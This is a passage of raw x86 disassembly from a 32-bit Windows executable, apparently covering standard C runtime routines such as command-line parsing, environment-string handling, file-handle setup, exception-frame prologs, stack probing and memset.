  402ba8:	cmp    BYTE PTR [ecx],0x22
  402bab:	jne    0x402bb1
  402bad:	mov    eax,ecx
  402baf:	jmp    0x402bb3
  402bb1:	xor    ebx,ebx
  402bb3:	xor    ecx,ecx
  402bb5:	cmp    DWORD PTR [ebp-0x4],ecx
  402bb8:	sete   cl
  402bbb:	mov    DWORD PTR [ebp-0x4],ecx
  402bbe:	shr    edx,1
  402bc0:	test   edx,edx
  402bc2:	je     0x402bd1
  402bc4:	test   edi,edi
  402bc6:	je     0x402bcc
  402bc8:	mov    BYTE PTR [edi],0x5c
  402bcb:	inc    edi
  402bcc:	inc    DWORD PTR [esi]
  402bce:	dec    edx
  402bcf:	jne    0x402bc4
  402bd1:	mov    cl,BYTE PTR [eax]
  402bd3:	test   cl,cl
  402bd5:	je     0x402c1f
  402bd7:	cmp    DWORD PTR [ebp-0x4],0x0
  402bdb:	jne    0x402be7
  402bdd:	cmp    cl,0x20
  402be0:	je     0x402c1f
  402be2:	cmp    cl,0x9
  402be5:	je     0x402c1f
  402be7:	test   ebx,ebx
  402be9:	je     0x402c19
  402beb:	test   edi,edi
  402bed:	je     0x402c08
  402bef:	movzx  edx,cl
  402bf2:	test   BYTE PTR [edx+0x4289e1],0x4
  402bf9:	je     0x402c01
  402bfb:	mov    BYTE PTR [edi],cl
  402bfd:	inc    edi
  402bfe:	inc    eax
  402bff:	inc    DWORD PTR [esi]
  402c01:	mov    cl,BYTE PTR [eax]
  402c03:	mov    BYTE PTR [edi],cl
  402c05:	inc    edi
  402c06:	jmp    0x402c17
  402c08:	movzx  ecx,cl
  402c0b:	test   BYTE PTR [ecx+0x4289e1],0x4
  402c12:	je     0x402c17
  402c14:	inc    eax
  402c15:	inc    DWORD PTR [esi]
  402c17:	inc    DWORD PTR [esi]
  402c19:	inc    eax
  402c1a:	jmp    0x402b87
  402c1f:	test   edi,edi
  402c21:	je     0x402c27
  402c23:	and    BYTE PTR [edi],0x0
  402c26:	inc    edi
  402c27:	inc    DWORD PTR [esi]
  402c29:	mov    ebx,DWORD PTR [ebp+0xc]
  402c2c:	jmp    0x402b52
  402c31:	mov    eax,DWORD PTR [ebp+0x8]
  402c34:	test   eax,eax
  402c36:	je     0x402c3b
  402c38:	and    DWORD PTR [eax],0x0
  402c3b:	inc    DWORD PTR [ebx]
  402c3d:	pop    edi
  402c3e:	pop    ebx
  402c3f:	leave  
  402c40:	ret    
  402c41:	push   ebp
  402c42:	mov    ebp,esp
  402c44:	push   ecx
  402c45:	push   ecx
  402c46:	push   ebx
  402c47:	push   esi
  402c48:	push   edi
  402c49:	xor    edi,edi
  402c4b:	cmp    DWORD PTR ds:0x428d2c,edi
  402c51:	jne    0x402c58
  402c53:	call   0x403ee3
  402c58:	and    BYTE PTR ds:0x42792c,0x0
  402c5f:	push   0x104
  402c64:	mov    esi,0x427828
  402c69:	push   esi
  402c6a:	push   edi
  402c6b:	call   DWORD PTR ds:0x42505c
  402c71:	mov    eax,ds:0x428d34
  402c76:	cmp    eax,edi
  402c78:	mov    DWORD PTR ds:0x427808,esi
  402c7e:	je     0x402c87
  402c80:	cmp    BYTE PTR [eax],0x0
  402c83:	mov    ebx,eax
  402c85:	jne    0x402c89
  402c87:	mov    ebx,esi
  402c89:	lea    eax,[ebp-0x4]
  402c8c:	push   eax
  402c8d:	push   edi
  402c8e:	lea    esi,[ebp-0x8]
  402c91:	xor    ecx,ecx
  402c93:	mov    eax,ebx
  402c95:	call   0x402ad5
  402c9a:	mov    esi,DWORD PTR [ebp-0x4]
  402c9d:	mov    eax,DWORD PTR [ebp-0x8]
  402ca0:	shl    esi,0x2
  402ca3:	add    eax,esi
  402ca5:	push   eax
  402ca6:	call   0x4034f2
  402cab:	mov    edi,eax
  402cad:	add    esp,0xc
  402cb0:	test   edi,edi
  402cb2:	jne    0x402cb9
  402cb4:	or     eax,0xffffffff
  402cb7:	jmp    0x402cde
  402cb9:	lea    eax,[ebp-0x4]
  402cbc:	push   eax
  402cbd:	lea    ecx,[esi+edi*1]
  402cc0:	push   edi
  402cc1:	lea    esi,[ebp-0x8]
  402cc4:	mov    eax,ebx
  402cc6:	call   0x402ad5
  402ccb:	mov    eax,DWORD PTR [ebp-0x4]
  402cce:	dec    eax
  402ccf:	pop    ecx
  402cd0:	mov    ds:0x4277ec,eax
  402cd5:	pop    ecx
  402cd6:	mov    DWORD PTR ds:0x4277f0,edi
  402cdc:	xor    eax,eax
  402cde:	pop    edi
  402cdf:	pop    esi
  402ce0:	pop    ebx
  402ce1:	leave  
  402ce2:	ret    
  402ce3:	push   ecx
  402ce4:	push   ecx
  402ce5:	mov    eax,ds:0x427930
  402cea:	push   ebx
  402ceb:	push   ebp
  402cec:	push   esi
  402ced:	push   edi
  402cee:	mov    edi,DWORD PTR ds:0x425074
  402cf4:	xor    ebx,ebx
  402cf6:	xor    esi,esi
  402cf8:	cmp    eax,ebx
  402cfa:	push   0x2
  402cfc:	pop    ebp
  402cfd:	jne    0x402d2c
  402cff:	call   edi
  402d01:	mov    esi,eax
  402d03:	cmp    esi,ebx
  402d05:	je     0x402d13
  402d07:	mov    DWORD PTR ds:0x427930,0x1
  402d11:	jmp    0x402d31
  402d13:	call   DWORD PTR ds:0x42501c
  402d19:	cmp    eax,0x78
  402d1c:	jne    0x402d27
  402d1e:	mov    eax,ebp
  402d20:	mov    ds:0x427930,eax
  402d25:	jmp    0x402d2c
  402d27:	mov    eax,ds:0x427930
  402d2c:	cmp    eax,0x1
  402d2f:	jne    0x402dae
  402d31:	cmp    esi,ebx
  402d33:	jne    0x402d3d
  402d35:	call   edi
  402d37:	mov    esi,eax
  402d39:	cmp    esi,ebx
  402d3b:	je     0x402db6
  402d3d:	cmp    WORD PTR [esi],bx
  402d40:	mov    eax,esi
  402d42:	je     0x402d52
  402d44:	add    eax,ebp
  402d46:	cmp    WORD PTR [eax],bx
  402d49:	jne    0x402d44
  402d4b:	add    eax,ebp
  402d4d:	cmp    WORD PTR [eax],bx
  402d50:	jne    0x402d44
  402d52:	mov    edi,DWORD PTR ds:0x425070
  402d58:	push   ebx
  402d59:	push   ebx
  402d5a:	push   ebx
  402d5b:	sub    eax,esi
  402d5d:	push   ebx
  402d5e:	sar    eax,1
  402d60:	inc    eax
  402d61:	push   eax
  402d62:	push   esi
  402d63:	push   ebx
  402d64:	push   ebx
  402d65:	mov    DWORD PTR [esp+0x34],eax
  402d69:	call   edi
  402d6b:	mov    ebp,eax
  402d6d:	cmp    ebp,ebx
  402d6f:	je     0x402da3
  402d71:	push   ebp
  402d72:	call   0x4034f2
  402d77:	cmp    eax,ebx
  402d79:	pop    ecx
  402d7a:	mov    DWORD PTR [esp+0x10],eax
  402d7e:	je     0x402da3
  402d80:	push   ebx
  402d81:	push   ebx
  402d82:	push   ebp
  402d83:	push   eax
  402d84:	push   DWORD PTR [esp+0x24]
  402d88:	push   esi
  402d89:	push   ebx
  402d8a:	push   ebx
  402d8b:	call   edi
  402d8d:	test   eax,eax
  402d8f:	jne    0x402d9f
  402d91:	push   DWORD PTR [esp+0x10]
  402d95:	call   0x40331e
  402d9a:	pop    ecx
  402d9b:	mov    DWORD PTR [esp+0x10],ebx
  402d9f:	mov    ebx,DWORD PTR [esp+0x10]
  402da3:	push   esi
  402da4:	call   DWORD PTR ds:0x42506c
  402daa:	mov    eax,ebx
  402dac:	jmp    0x402dfe
  402dae:	cmp    eax,ebp
  402db0:	je     0x402dba
  402db2:	cmp    eax,ebx
  402db4:	je     0x402dba
  402db6:	xor    eax,eax
  402db8:	jmp    0x402dfe
  402dba:	call   DWORD PTR ds:0x425068
  402dc0:	mov    esi,eax
  402dc2:	cmp    esi,ebx
  402dc4:	je     0x402db6
  402dc6:	cmp    BYTE PTR [esi],bl
  402dc8:	je     0x402dd4
  402dca:	inc    eax
  402dcb:	cmp    BYTE PTR [eax],bl
  402dcd:	jne    0x402dca
  402dcf:	inc    eax
  402dd0:	cmp    BYTE PTR [eax],bl
  402dd2:	jne    0x402dca
  402dd4:	sub    eax,esi
  402dd6:	inc    eax
  402dd7:	mov    ebp,eax
  402dd9:	push   ebp
  402dda:	call   0x4034f2
  402ddf:	mov    edi,eax
  402de1:	cmp    edi,ebx
  402de3:	pop    ecx
  402de4:	jne    0x402dea
  402de6:	xor    edi,edi
  402de8:	jmp    0x402df5
  402dea:	push   ebp
  402deb:	push   esi
  402dec:	push   edi
  402ded:	call   0x4013d0
  402df2:	add    esp,0xc
  402df5:	push   esi
  402df6:	call   DWORD PTR ds:0x425064
  402dfc:	mov    eax,edi
  402dfe:	pop    edi
  402dff:	pop    esi
  402e00:	pop    ebp
  402e01:	pop    ebx
  402e02:	pop    ecx
  402e03:	pop    ecx
  402e04:	ret    
  402e05:	sub    esp,0x44
  402e08:	push   0x100
  402e0d:	call   0x4034f2
  402e12:	test   eax,eax
  402e14:	pop    ecx
  402e15:	jne    0x402e1f
  402e17:	or     eax,0xffffffff
  402e1a:	jmp    0x402fac
  402e1f:	mov    ds:0x428c20,eax
  402e24:	mov    DWORD PTR ds:0x428c08,0x20
  402e2e:	lea    ecx,[eax+0x100]
  402e34:	jmp    0x402e50
  402e36:	and    BYTE PTR [eax+0x4],0x0
  402e3a:	or     DWORD PTR [eax],0xffffffff
  402e3d:	mov    BYTE PTR [eax+0x5],0xa
  402e41:	mov    ecx,DWORD PTR ds:0x428c20
  402e47:	add    eax,0x8
  402e4a:	add    ecx,0x100
  402e50:	cmp    eax,ecx
  402e52:	jb     0x402e36
  402e54:	push   ebx
  402e55:	push   esi
  402e56:	push   edi
  402e57:	lea    eax,[esp+0xc]
  402e5b:	push   eax
  402e5c:	call   DWORD PTR ds:0x42503c
  402e62:	cmp    WORD PTR [esp+0x3e],0x0
  402e68:	je     0x402f35
  402e6e:	mov    eax,DWORD PTR [esp+0x40]
  402e72:	test   eax,eax
  402e74:	je     0x402f35
  402e7a:	mov    esi,DWORD PTR [eax]
  402e7c:	push   ebp
  402e7d:	lea    ebp,[eax+0x4]
  402e80:	mov    eax,0x800
  402e85:	cmp    esi,eax
  402e87:	lea    ebx,[esi+ebp*1]
  402e8a:	jl     0x402e8e
  402e8c:	mov    esi,eax
  402e8e:	cmp    DWORD PTR ds:0x428c08,esi
  402e94:	jge    0x402ee8
  402e96:	mov    edi,0x428c24
  402e9b:	push   0x100
  402ea0:	call   0x4034f2
  402ea5:	test   eax,eax
  402ea7:	pop    ecx
  402ea8:	je     0x402ee2
  402eaa:	add    DWORD PTR ds:0x428c08,0x20
  402eb1:	mov    DWORD PTR [edi],eax
  402eb3:	lea    ecx,[eax+0x100]
  402eb9:	jmp    0x402ed1
  402ebb:	and    BYTE PTR [eax+0x4],0x0
  402ebf:	or     DWORD PTR [eax],0xffffffff
  402ec2:	mov    BYTE PTR [eax+0x5],0xa
  402ec6:	mov    ecx,DWORD PTR [edi]
  402ec8:	add    eax,0x8
  402ecb:	add    ecx,0x100
  402ed1:	cmp    eax,ecx
  402ed3:	jb     0x402ebb
  402ed5:	add    edi,0x4
  402ed8:	cmp    DWORD PTR ds:0x428c08,esi
  402ede:	jl     0x402e9b
  402ee0:	jmp    0x402ee8
  402ee2:	mov    esi,DWORD PTR ds:0x428c08
  402ee8:	xor    edi,edi
  402eea:	test   esi,esi
  402eec:	jle    0x402f34
  402eee:	mov    eax,DWORD PTR [ebx]
  402ef0:	cmp    eax,0xffffffff
  402ef3:	je     0x402f2b
  402ef5:	mov    cl,BYTE PTR [ebp+0x0]
  402ef8:	test   cl,0x1
  402efb:	je     0x402f2b
  402efd:	test   cl,0x8
  402f00:	jne    0x402f0d
  402f02:	push   eax
  402f03:	call   DWORD PTR ds:0x42507c
  402f09:	test   eax,eax
  402f0b:	je     0x402f2b
  402f0d:	mov    eax,edi
  402f0f:	sar    eax,0x5
  402f12:	mov    eax,DWORD PTR [eax*4+0x428c20]
  402f19:	mov    ecx,edi
  402f1b:	and    ecx,0x1f
  402f1e:	lea    eax,[eax+ecx*8]
  402f21:	mov    ecx,DWORD PTR [ebx]
  402f23:	mov    DWORD PTR [eax],ecx
  402f25:	mov    cl,BYTE PTR [ebp+0x0]
  402f28:	mov    BYTE PTR [eax+0x4],cl
  402f2b:	inc    edi
  402f2c:	inc    ebp
  402f2d:	add    ebx,0x4
  402f30:	cmp    edi,esi
  402f32:	jl     0x402eee
  402f34:	pop    ebp
  402f35:	xor    ebx,ebx
  402f37:	mov    eax,ds:0x428c20
  402f3c:	lea    esi,[eax+ebx*8]
  402f3f:	cmp    DWORD PTR [esi],0xffffffff
  402f42:	jne    0x402f91
  402f44:	test   ebx,ebx
  402f46:	mov    BYTE PTR [esi+0x4],0x81
  402f4a:	jne    0x402f51
  402f4c:	push   0xfffffff6
  402f4e:	pop    eax
  402f4f:	jmp    0x402f5b
  402f51:	mov    eax,ebx
  402f53:	dec    eax
  402f54:	neg    eax
  402f56:	sbb    eax,eax
  402f58:	add    eax,0xfffffff5
  402f5b:	push   eax
  402f5c:	call   DWORD PTR ds:0x425058
  402f62:	mov    edi,eax
  402f64:	cmp    edi,0xffffffff
  402f67:	je     0x402f80
  402f69:	push   edi
  402f6a:	call   DWORD PTR ds:0x42507c
  402f70:	test   eax,eax
  402f72:	je     0x402f80
  402f74:	and    eax,0xff
  402f79:	cmp    eax,0x2
  402f7c:	mov    DWORD PTR [esi],edi
  402f7e:	jne    0x402f86
  402f80:	or     BYTE PTR [esi+0x4],0x40
  402f84:	jmp    0x402f95
  402f86:	cmp    eax,0x3
  402f89:	jne    0x402f95
  402f8b:	or     BYTE PTR [esi+0x4],0x8
  402f8f:	jmp    0x402f95
  402f91:	or     BYTE PTR [esi+0x4],0x80
  402f95:	inc    ebx
  402f96:	cmp    ebx,0x3
  402f99:	jl     0x402f37
  402f9b:	push   DWORD PTR ds:0x428c08
  402fa1:	call   DWORD PTR ds:0x425078
  402fa7:	pop    edi
  402fa8:	pop    esi
  402fa9:	xor    eax,eax
  402fab:	pop    ebx
  402fac:	add    esp,0x44
  402faf:	ret    
  402fb0:	push   0xc
  402fb2:	push   0x4254b0
  402fb7:	call   0x4030a4
  402fbc:	mov    DWORD PTR [ebp-0x1c],0x425b88
  402fc3:	cmp    DWORD PTR [ebp-0x1c],0x425b88
  402fca:	jae    0x402fee
  402fcc:	and    DWORD PTR [ebp-0x4],0x0
  402fd0:	mov    eax,DWORD PTR [ebp-0x1c]
  402fd3:	mov    eax,DWORD PTR [eax]
  402fd5:	test   eax,eax
  402fd7:	je     0x402fe4
  402fd9:	call   eax
  402fdb:	jmp    0x402fe4
  402fdd:	xor    eax,eax
  402fdf:	inc    eax
  402fe0:	ret    
  402fe1:	mov    esp,DWORD PTR [ebp-0x18]
  402fe4:	or     DWORD PTR [ebp-0x4],0xffffffff
  402fe8:	add    DWORD PTR [ebp-0x1c],0x4
  402fec:	jmp    0x402fc3
  402fee:	call   0x4030df
  402ff3:	ret    
  402ff4:	push   0xc
  402ff6:	push   0x4254c0
  402ffb:	call   0x4030a4
  403000:	mov    DWORD PTR [ebp-0x1c],0x425b90
  403007:	cmp    DWORD PTR [ebp-0x1c],0x425b90
  40300e:	jae    0x403032
  403010:	and    DWORD PTR [ebp-0x4],0x0
  403014:	mov    eax,DWORD PTR [ebp-0x1c]
  403017:	mov    eax,DWORD PTR [eax]
  403019:	test   eax,eax
  40301b:	je     0x403028
  40301d:	call   eax
  40301f:	jmp    0x403028
  403021:	xor    eax,eax
  403023:	inc    eax
  403024:	ret    
  403025:	mov    esp,DWORD PTR [ebp-0x18]
  403028:	or     DWORD PTR [ebp-0x4],0xffffffff
  40302c:	add    DWORD PTR [ebp-0x1c],0x4
  403030:	jmp    0x403007
  403032:	call   0x4030df
  403037:	ret    
  403038:	cmp    DWORD PTR ds:0x4277d8,0x2
  40303f:	jne    0x40304e
  403041:	cmp    DWORD PTR ds:0x4277e4,0x5
  403048:	jb     0x40304e
  40304a:	xor    eax,eax
  40304c:	inc    eax
  40304d:	ret    
  40304e:	push   0x3
  403050:	pop    eax
  403051:	ret    
  403052:	xor    eax,eax
  403054:	cmp    DWORD PTR [esp+0x4],eax
  403058:	push   0x0
  40305a:	sete   al
  40305d:	push   0x1000
  403062:	push   eax
  403063:	call   DWORD PTR ds:0x425084
  403069:	test   eax,eax
  40306b:	mov    ds:0x428c00,eax
  403070:	je     0x40309c
  403072:	call   0x403038
  403077:	cmp    eax,0x3
  40307a:	mov    ds:0x428c04,eax
  40307f:	jne    0x40309f
  403081:	push   0x3f8
  403086:	call   0x403f01
  40308b:	test   eax,eax
  40308d:	pop    ecx
  40308e:	jne    0x40309f
  403090:	push   DWORD PTR ds:0x428c00
  403096:	call   DWORD PTR ds:0x425080
  40309c:	xor    eax,eax
  40309e:	ret    
  40309f:	xor    eax,eax
  4030a1:	inc    eax
  4030a2:	ret    
  4030a3:	int3   
  4030a4:	push   0x404a2c
  4030a9:	mov    eax,fs:0x0
  4030af:	push   eax
  4030b0:	mov    eax,DWORD PTR [esp+0x10]
  4030b4:	mov    DWORD PTR [esp+0x10],ebp
  4030b8:	lea    ebp,[esp+0x10]
  4030bc:	sub    esp,eax
  4030be:	push   ebx
  4030bf:	push   esi
  4030c0:	push   edi
  4030c1:	mov    eax,DWORD PTR [ebp-0x8]
  4030c4:	mov    DWORD PTR [ebp-0x18],esp
  4030c7:	push   eax
  4030c8:	mov    eax,DWORD PTR [ebp-0x4]
  4030cb:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4030d2:	mov    DWORD PTR [ebp-0x8],eax
  4030d5:	lea    eax,[ebp-0x10]
  4030d8:	mov    fs:0x0,eax
  4030de:	ret    
  4030df:	mov    ecx,DWORD PTR [ebp-0x10]
  4030e2:	mov    DWORD PTR fs:0x0,ecx
  4030e9:	pop    ecx
  4030ea:	pop    edi
  4030eb:	pop    esi
  4030ec:	pop    ebx
  4030ed:	leave  
  4030ee:	push   ecx
  4030ef:	ret    
  4030f0:	cmp    eax,0x1000
  4030f5:	jae    0x403105
  4030f7:	neg    eax
  4030f9:	add    eax,esp
  4030fb:	add    eax,0x4
  4030fe:	test   DWORD PTR [eax],eax
  403100:	xchg   esp,eax
  403101:	mov    eax,DWORD PTR [eax]
  403103:	push   eax
  403104:	ret    
  403105:	push   ecx
  403106:	lea    ecx,[esp+0x8]
  40310a:	sub    ecx,0x1000
  403110:	sub    eax,0x1000
  403115:	test   DWORD PTR [ecx],eax
  403117:	cmp    eax,0x1000
  40311c:	jae    0x40310a
  40311e:	sub    ecx,eax
  403120:	mov    eax,esp
  403122:	test   DWORD PTR [ecx],eax
  403124:	mov    esp,ecx
  403126:	mov    ecx,DWORD PTR [eax]
  403128:	mov    eax,DWORD PTR [eax+0x4]
  40312b:	push   eax
  40312c:	ret    
  40312d:	push   ebp
  40312e:	mov    ebp,esp
  403130:	push   ecx
  403131:	mov    eax,DWORD PTR [ebp+0x8]
  403134:	lea    ecx,[eax+0x1]
  403137:	cmp    ecx,0x100
  40313d:	ja     0x40314b
  40313f:	mov    ecx,DWORD PTR ds:0x427270
  403145:	movzx  eax,WORD PTR [ecx+eax*2]
  403149:	jmp    0x4031a6
  40314b:	mov    ecx,eax
  40314d:	sar    ecx,0x8
  403150:	push   esi
  403151:	mov    esi,DWORD PTR ds:0x427270
  403157:	movzx  edx,cl
  40315a:	test   BYTE PTR [esi+edx*2+0x1],0x80
  40315f:	pop    esi
  403160:	je     0x403171
  403162:	and    BYTE PTR [ebp-0x2],0x0
  403166:	push   0x2
  403168:	mov    BYTE PTR [ebp-0x3],al
  40316b:	mov    BYTE PTR [ebp-0x4],cl
  40316e:	pop    eax
  40316f:	jmp    0x40317b
  403171:	and    BYTE PTR [ebp-0x3],0x0
  403175:	mov    BYTE PTR [ebp-0x4],al
  403178:	xor    eax,eax
  40317a:	inc    eax
  40317b:	push   0x1
  40317d:	push   DWORD PTR ds:0x427958
  403183:	lea    ecx,[ebp+0xa]
  403186:	push   DWORD PTR ds:0x427968
  40318c:	push   ecx
  40318d:	push   eax
  40318e:	lea    eax,[ebp-0x4]
  403191:	push   eax
  403192:	push   0x1
  403194:	call   0x404b04
  403199:	add    esp,0x1c
  40319c:	test   eax,eax
  40319e:	jne    0x4031a2
  4031a0:	leave  
  4031a1:	ret    
  4031a2:	movzx  eax,WORD PTR [ebp+0xa]
  4031a6:	and    eax,DWORD PTR [ebp+0xc]
  4031a9:	leave  
  4031aa:	ret    
  4031ab:	push   esi
  4031ac:	mov    esi,DWORD PTR [esp+0x8]
  4031b0:	mov    eax,DWORD PTR [esi+0xc]
  4031b3:	test   al,0x83
  4031b5:	je     0x403284
  4031bb:	test   al,0x40
  4031bd:	jne    0x403284
  4031c3:	test   al,0x2
  4031c5:	je     0x4031d2
  4031c7:	or     eax,0x20
  4031ca:	mov    DWORD PTR [esi+0xc],eax
  4031cd:	jmp    0x403284
  4031d2:	or     eax,0x1
  4031d5:	test   ax,0x10c
  4031d9:	mov    DWORD PTR [esi+0xc],eax
  4031dc:	jne    0x4031e7
  4031de:	push   esi
  4031df:	call   0x404e9e
  4031e4:	pop    ecx
  4031e5:	jmp    0x4031ec
  4031e7:	mov    eax,DWORD PTR [esi+0x8]
  4031ea:	mov    DWORD PTR [esi],eax
  4031ec:	push   DWORD PTR [esi+0x18]
  4031ef:	push   DWORD PTR [esi+0x8]
  4031f2:	push   DWORD PTR [esi+0x10]
  4031f5:	call   0x404cbe
  4031fa:	add    esp,0xc
  4031fd:	test   eax,eax
  4031ff:	mov    DWORD PTR [esi+0x4],eax
  403202:	je     0x403273
  403204:	cmp    eax,0xffffffff
  403207:	je     0x403273
  403209:	mov    edx,DWORD PTR [esi+0xc]
  40320c:	test   dl,0x82
  40320f:	jne    0x403248
  403211:	mov    ecx,DWORD PTR [esi+0x10]
  403214:	cmp    ecx,0xffffffff
  403217:	push   edi
  403218:	je     0x40322e
  40321a:	mov    edi,ecx
  40321c:	sar    edi,0x5
  40321f:	mov    edi,DWORD PTR [edi*4+0x428c20]
  403226:	and    ecx,0x1f
  403229:	lea    edi,[edi+ecx*8]
  40322c:	jmp    0x403233
  40322e:	mov    edi,0x427260
  403233:	mov    cl,BYTE PTR [edi+0x4]
  403236:	and    cl,0x82
  403239:	cmp    cl,0x82
  40323c:	pop    edi
  40323d:	jne    0x403248
  40323f:	or     edx,0x2000
  403245:	mov    DWORD PTR [esi+0xc],edx
  403248:	cmp    DWORD PTR [esi+0x18],0x200
  40324f:	jne    0x403265
  403251:	mov    ecx,DWORD PTR [esi+0xc]
  403254:	test   cl,0x8
  403257:	je     0x403265
  403259:	test   ch,0x4
  40325c:	jne    0x403265
  40325e:	mov    DWORD PTR [esi+0x18],0x1000
  403265:	mov    ecx,DWORD PTR [esi]
  403267:	dec    eax
  403268:	mov    DWORD PTR [esi+0x4],eax
  40326b:	movzx  eax,BYTE PTR [ecx]
  40326e:	inc    ecx
  40326f:	mov    DWORD PTR [esi],ecx
  403271:	pop    esi
  403272:	ret    
  403273:	neg    eax
  403275:	sbb    eax,eax
  403277:	and    eax,0x10
  40327a:	add    eax,0x10
  40327d:	or     DWORD PTR [esi+0xc],eax
  403280:	and    DWORD PTR [esi+0x4],0x0
  403284:	or     eax,0xffffffff
  403287:	pop    esi
  403288:	ret    
  403289:	push   ebx
  40328a:	mov    ebx,DWORD PTR [esp+0x8]
  40328e:	cmp    ebx,0xffffffff
  403291:	push   esi
  403292:	je     0x4032d5
  403294:	mov    esi,DWORD PTR [esp+0x10]
  403298:	mov    eax,DWORD PTR [esi+0xc]
  40329b:	test   al,0x1
  40329d:	jne    0x4032a7
  40329f:	test   al,al
  4032a1:	jns    0x4032d5
  4032a3:	test   al,0x2
  4032a5:	jne    0x4032d5
  4032a7:	cmp    DWORD PTR [esi+0x8],0x0
  4032ab:	jne    0x4032b4
  4032ad:	push   esi
  4032ae:	call   0x404e9e
  4032b3:	pop    ecx
  4032b4:	mov    eax,DWORD PTR [esi]
  4032b6:	cmp    eax,DWORD PTR [esi+0x8]
  4032b9:	jne    0x4032c4
  4032bb:	cmp    DWORD PTR [esi+0x4],0x0
  4032bf:	jne    0x4032d5
  4032c1:	inc    eax
  4032c2:	mov    DWORD PTR [esi],eax
  4032c4:	dec    DWORD PTR [esi]
  4032c6:	test   BYTE PTR [esi+0xc],0x40
  4032ca:	mov    eax,DWORD PTR [esi]
  4032cc:	je     0x4032db
  4032ce:	cmp    BYTE PTR [eax],bl
  4032d0:	je     0x4032dd
  4032d2:	inc    eax
  4032d3:	mov    DWORD PTR [esi],eax
  4032d5:	or     eax,0xffffffff
  4032d8:	pop    esi
  4032d9:	pop    ebx
  4032da:	ret    
  4032db:	mov    BYTE PTR [eax],bl
  4032dd:	mov    eax,DWORD PTR [esi+0xc]
  4032e0:	inc    DWORD PTR [esi+0x4]
  4032e3:	and    eax,0xffffffef
  4032e6:	or     eax,0x1
  4032e9:	mov    DWORD PTR [esi+0xc],eax
  4032ec:	mov    eax,ebx
  4032ee:	and    eax,0xff
  4032f3:	jmp    0x4032d8
  4032f5:	cmp    DWORD PTR ds:0x427278,0x1
  4032fc:	jle    0x40330c
  4032fe:	push   0x8
  403300:	push   DWORD PTR [esp+0x8]
  403304:	call   0x40312d
  403309:	pop    ecx
  40330a:	pop    ecx
  40330b:	ret    
  40330c:	mov    eax,DWORD PTR [esp+0x4]
  403310:	mov    ecx,DWORD PTR ds:0x427270
  403316:	movzx  eax,BYTE PTR [ecx+eax*2]
  40331a:	and    eax,0x8
  40331d:	ret    
  40331e:	push   esi
  40331f:	mov    esi,DWORD PTR [esp+0x8]
  403323:	test   esi,esi
  403325:	je     0x403354
  403327:	cmp    DWORD PTR ds:0x428c04,0x3
  40332e:	push   esi
  40332f:	jne    0x403346
  403331:	call   0x403f49
  403336:	test   eax,eax
  403338:	pop    ecx
  403339:	push   esi
  40333a:	je     0x403346
  40333c:	push   eax
  40333d:	call   0x403f74
  403342:	pop    ecx
  403343:	pop    ecx
  403344:	pop    esi
  403345:	ret    
  403346:	push   0x0
  403348:	push   DWORD PTR ds:0x428c00
  40334e:	call   DWORD PTR ds:0x425088
  403354:	pop    esi
  403355:	ret    
  403356:	push   ebp
  403357:	mov    ebp,esp
  403359:	push   ebx
  40335a:	push   esi
  40335b:	mov    esi,DWORD PTR [ebp+0xc]
  40335e:	xor    ebx,ebx
  403360:	cmp    esi,ebx
  403362:	je     0x403379
  403364:	cmp    DWORD PTR [ebp+0x10],ebx
  403367:	je     0x403379
  403369:	mov    al,BYTE PTR [esi]
  40336b:	cmp    al,bl
  40336d:	jne    0x40337f
  40336f:	mov    eax,DWORD PTR [ebp+0x8]
  403372:	cmp    eax,ebx
  403374:	je     0x403379
  403376:	mov    WORD PTR [eax],bx
  403379:	xor    eax,eax
  40337b:	pop    esi
  40337c:	pop    ebx
  40337d:	pop    ebp
  40337e:	ret    
  40337f:	cmp    DWORD PTR ds:0x427958,ebx
  403385:	jne    0x40339a
  403387:	mov    ecx,DWORD PTR [ebp+0x8]
  40338a:	cmp    ecx,ebx
  40338c:	je     0x403395
  40338e:	movzx  ax,al
  403392:	mov    WORD PTR [ecx],ax
  403395:	xor    eax,eax
  403397:	inc    eax
  403398:	jmp    0x40337b
  40339a:	mov    ecx,DWORD PTR ds:0x427270
  4033a0:	movzx  eax,al
  4033a3:	test   BYTE PTR [ecx+eax*2+0x1],0x80
  4033a8:	je     0x4033f7
  4033aa:	mov    eax,ds:0x427278
  4033af:	cmp    eax,0x1
  4033b2:	jle    0x4033de
  4033b4:	cmp    DWORD PTR [ebp+0x10],eax
  4033b7:	jl     0x4033e1
  4033b9:	xor    ecx,ecx
  4033bb:	cmp    DWORD PTR [ebp+0x8],ebx
  4033be:	setne  cl
  4033c1:	push   ecx
  4033c2:	push   DWORD PTR [ebp+0x8]
  4033c5:	push   eax
  4033c6:	push   esi
  4033c7:	push   0x9
  4033c9:	push   DWORD PTR ds:0x427968
  4033cf:	call   DWORD PTR ds:0x42508c
  4033d5:	test   eax,eax
  4033d7:	mov    eax,ds:0x427278
  4033dc:	jne    0x40337b
  4033de:	cmp    DWORD PTR [ebp+0x10],eax
  4033e1:	jb     0x4033e8
  4033e3:	cmp    BYTE PTR [esi+0x1],bl
  4033e6:	jne    0x40337b
  4033e8:	mov    DWORD PTR ds:0x4277cc,0x2a
  4033f2:	or     eax,0xffffffff
  4033f5:	jmp    0x40337b
  4033f7:	xor    eax,eax
  4033f9:	cmp    DWORD PTR [ebp+0x8],ebx
  4033fc:	setne  al
  4033ff:	push   eax
  403400:	push   DWORD PTR [ebp+0x8]
  403403:	push   0x1
  403405:	push   esi
  403406:	push   0x9
  403408:	push   DWORD PTR ds:0x427968
  40340e:	call   DWORD PTR ds:0x42508c
  403414:	test   eax,eax
  403416:	jne    0x403395
  40341c:	jmp    0x4033e8
  40341e:	int3   
  40341f:	int3   
  403420:	mov    edx,DWORD PTR [esp+0xc]
  403424:	mov    ecx,DWORD PTR [esp+0x4]
  403428:	test   edx,edx
  40342a:	je     0x40347b
  40342c:	xor    eax,eax
  40342e:	mov    al,BYTE PTR [esp+0x8]
  403432:	push   edi
  403433:	mov    edi,ecx
  403435:	cmp    edx,0x4
  403438:	jb     0x40346b
  40343a:	neg    ecx
  40343c:	and    ecx,0x3
  40343f:	je     0x40344d
  403441:	sub    edx,ecx
  403443:	mov    BYTE PTR [edi],al
  403445:	add    edi,0x1
  403448:	sub    ecx,0x1
  40344b:	jne    0x403443
  40344d:	mov    ecx,eax
  40344f:	shl    eax,0x8
  403452:	add    eax,ecx
  403454:	mov    ecx,eax
  403456:	shl    eax,0x10
  403459:	add    eax,ecx
  40345b:	mov    ecx,edx
  40345d:	and    edx,0x3
  403460:	shr    ecx,0x2
  403463:	je     0x40346b
